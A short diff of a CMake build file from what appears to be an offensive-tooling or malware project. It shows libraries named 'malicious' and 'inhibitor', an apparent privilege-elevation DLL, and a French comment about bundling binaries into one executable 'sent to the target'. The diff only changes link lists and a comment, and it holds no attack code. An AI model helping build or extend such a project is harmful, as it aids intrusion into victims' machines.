@@ -1,7 +1,6 @@
-link_directories(${CMAKE_SOURCE_DIR}/utils/jpeg)
 file(GLOB_RECURSE substrate_source_files substrate/*.hpp substrate/*.cpp)
 add_library(substrate SHARED ${substrate_source_files})
-target_link_libraries(substrate system network blaspheme malicious common gdi32 userenv jpeg)
+target_link_libraries(substrate system network blaspheme malicious common userenv)
 
 # Le generateur de ressource va créer des headers a partir de fichiers binaires afin
 # de ne produire qu'un seul executable final a envoyer a la cible
@@ -83,7 +82,7 @@ add_custom_command(
 	COMMENT "Generating ${ELEVATORDLL64_HPP_PATH} WITH ${ELEVATORDLL64_DLL_PATH}"
 )
 
-# substrate n'est pas ici que pour etre sur qu'il est construit avant inhibitor
+# substrate est dans liste car il DOIT etre construit avant inhibitor
 target_link_libraries(inhibitor common malicious system network substrate shlwapi)
 install(TARGETS inhibitor RUNTIME DESTINATION innocence)
 
